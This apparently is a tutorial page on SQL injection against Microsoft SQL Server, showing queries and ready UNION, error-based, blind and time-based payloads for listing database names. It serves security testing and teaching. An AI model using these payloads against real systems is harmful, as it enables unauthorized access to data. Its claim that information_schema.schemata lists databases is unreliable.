---
title: Database Names
description: How to retrieve database names from Microsoft SQL Server
category: Information Gathering
order: 5
tags: ["database enumeration", "information schema"]
lastUpdated: 2025-03-15
---

## Database Names

Extracting database names is often a crucial step in SQL injection attacks against Microsoft SQL Server. This information helps map the database landscape and identify potential targets for further exploitation.

### System Tables and Views with Database Information

| Source                        | Description                             | Requires Privileges |
| ----------------------------- | --------------------------------------- | ------------------- |
| `sys.databases`               | Contains detailed database information  | Medium              |
| `master.dbo.sysdatabases`     | Legacy view (older SQL Server versions) | Medium              |
| `information_schema.schemata` | ANSI standard view for databases        | Low                 |
| `master..sysdatabases`        | Another legacy format                   | Medium              |

### Current Database Context

To get the name of the current database:

```sql
SELECT DB_NAME();
```

### List All Databases

#### Using sys.databases (SQL Server 2005+)

```sql
-- Get all database names
SELECT name FROM sys.databases;

-- Get databases with additional details
SELECT name, database_id, create_date, compatibility_level
FROM sys.databases
ORDER BY name;
```

#### Using information_schema (ANSI Standard)

```sql
-- List all database schemas
SELECT catalog_name FROM information_schema.schemata;
```

#### Using Legacy System Tables (SQL Server 2000 and earlier)

```sql
-- Using master..sysdatabases
SELECT name FROM master..sysdatabases;

-- Using master.dbo.sysdatabases
SELECT name FROM master.dbo.sysdatabases;
```

### Filtering Database Results

```sql
-- Get user databases only (excluding system databases)
SELECT name FROM sys.databases
WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb');

-- Get databases created after a specific date
SELECT name, create_date FROM sys.databases
WHERE create_date > '2022-01-01';
```

### Advanced Techniques

#### In Case of Limited Output

When you can only retrieve one value at a time, consider using string concatenation:

```sql
-- Concatenate database names into a single string
SELECT STRING_AGG(name, ',') FROM sys.databases;

-- For SQL Server 2016 and earlier without STRING_AGG
SELECT STUFF((
    SELECT ',' + name
    FROM sys.databases
    FOR XML PATH('')
), 1, 1, '');
```

#### Using FOR XML PATH For Extraction

```sql
-- Get databases as XML
SELECT name AS 'db' FROM sys.databases FOR XML PATH('');
```

### Error-Based Extraction

Using error messages to extract database names:

```sql
-- Error-based extraction using CONVERT
SELECT CONVERT(int, (SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')));

-- Using CAST
SELECT CAST((SELECT TOP 1 name FROM sys.databases) AS int);
```

### Blind Extraction Techniques

For blind SQL injection:

```sql
-- Check if character at position X matches Y
AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 -- ASCII 'm' = 109

-- Using time-based verification
IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 WAITFOR DELAY '0:0:5'
```

### Practical Examples in Injection Context

```sql
-- Using UNION attack
' UNION SELECT NULL, name, NULL FROM sys.databases--

-- Error-based attack
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))--

-- Blind attack checking for 'master' database
' AND SUBSTRING((SELECT TOP 1 name FROM sys.databases ORDER BY name), 1, 6) = 'master'--
```

### Notes

1. Some system tables and views require elevated privileges.
2. The `master` database always exists and is a common first target.
3. The `sys.databases` view is available from SQL Server 2005 onwards.
4. `information_schema.schemata` is the most standards-compliant approach.
5. Database names retrieved might be truncated if the output medium has character limitations.
